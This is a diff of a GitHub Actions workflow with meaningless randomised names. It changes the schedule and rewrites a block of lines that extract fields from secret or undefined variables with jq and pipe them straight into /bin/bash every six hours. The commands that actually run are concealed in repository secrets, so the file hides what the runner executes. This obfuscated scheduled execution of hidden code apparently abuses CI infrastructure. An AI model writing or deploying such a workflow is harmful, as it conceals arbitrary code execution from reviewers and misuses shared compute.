@@ -1,35 +1,34 @@
 name: wangxianglong4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
+    - cron: '24 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangxianglong4567
         env:
-          m22077: ${{ secrets.m22077 }}
+          rnzpi6476: ${{ secrets.rnzpi6476 }}
         run: |
-          echo $m22077 | jq -r .touk3 | /bin/bash
-          echo $voulr0655 | jq -r .ol6 | /bin/bash
-          echo $j33349 | jq -r .roxmg8501 | /bin/bash
-          echo $htip5886 | jq -r .vgl271 | /bin/bash
-          echo $qcpal0676 | jq -r .awz1689 | /bin/bash
-          echo $ytad1 | jq -r .zrd9 | /bin/bash
-          echo $hbbdk8 | jq -r .h5 | /bin/bash
-          echo $ecr857 | jq -r .zb71462 | /bin/bash
-          echo $lpufe75 | jq -r .buxoq6 | /bin/bash
-          echo $qhmrl0 | jq -r .e16548 | /bin/bash
-          echo $vhl35677 | jq -r .y6 | /bin/bash
-          echo $weuwu87639 | jq -r .lsx53 | /bin/bash
-          echo $bms7 | jq -r .tytmm75 | /bin/bash
-          echo $xcwk3 | jq -r .pllbm956 | /bin/bash
-          echo $mkdg75 | jq -r .k4 | /bin/bash
-          echo $k3 | jq -r .ucvw60 | /bin/bash
-          echo $i784 | jq -r .ndt548 | /bin/bash
-          echo $hmvz093 | jq -r .uqj428 | /bin/bash
+          echo $rnzpi6476 | jq -r .im671 | /bin/bash
+          echo $f0 | jq -r .wfc901 | /bin/bash
+          echo $sdn32451 | jq -r .y86735 | /bin/bash
+          echo $e01166 | jq -r .l38 | /bin/bash
+          echo $g06656 | jq -r .bltbc25 | /bin/bash
+          echo $qmyhf4577 | jq -r .sry95554 | /bin/bash
+          echo $zzrrz344 | jq -r .ub9211 | /bin/bash
+          echo $ocmw58229 | jq -r .fv779 | /bin/bash
+          echo $vgjr462 | jq -r .hn63 | /bin/bash
+          echo $yuons79946 | jq -r .oljj070 | /bin/bash
+          echo $fygbh72119 | jq -r .y36093 | /bin/bash
+          echo $ncbz14 | jq -r .bksx62 | /bin/bash
+          echo $x718 | jq -r .fyt11636 | /bin/bash
+          echo $mxik6 | jq -r .e34 | /bin/bash
+          echo $yr595 | jq -r .tpg07400 | /bin/bash
+          echo $m03155 | jq -r .edrxl128 | /bin/bash
+          echo $kesu20655 | jq -r .nnd36668 | /bin/bash
 
